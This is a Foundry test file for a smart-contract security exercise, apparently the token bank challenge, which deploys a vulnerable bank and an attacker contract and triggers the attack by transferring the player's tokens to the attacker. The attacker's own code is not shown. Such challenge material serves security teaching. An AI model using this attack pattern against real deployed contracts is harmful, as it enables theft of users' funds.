// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "week8-9-security/TokenBank.sol";

contract TokenBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here

        // Withdraw player's tokens
        uint256 balance = tokenBankChallenge.balanceOf(player);
        vm.prank(player);
        tokenBankChallenge.withdraw(balance);

        // Transfer player's tokens to attacker, which starts the attack
        SimpleERC223Token token = tokenBankChallenge.token();
        vm.prank(player);
        token.transfer(address(tokenBankAttacker), balance);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
